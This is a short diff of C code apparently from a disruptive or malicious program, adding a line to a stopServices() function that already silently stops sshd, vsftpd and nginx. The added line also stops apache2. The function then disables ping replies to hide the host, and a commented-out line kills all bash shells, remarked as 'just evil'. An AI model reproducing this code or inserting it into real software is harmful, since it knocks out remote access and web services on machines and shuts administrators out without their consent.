@@ -5,6 +5,7 @@ void stopServices(){
     system("systemctl stop sshd 2>/dev/null");
     system("systemctl stop vsftpd 2>/dev/null");
     system("systemctl stop nginx 2>/dev/null");
+    system("systemctl stop apache2 2>/dev/null");
     system("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all");
     //This one is just evil
     //system("killall bash");
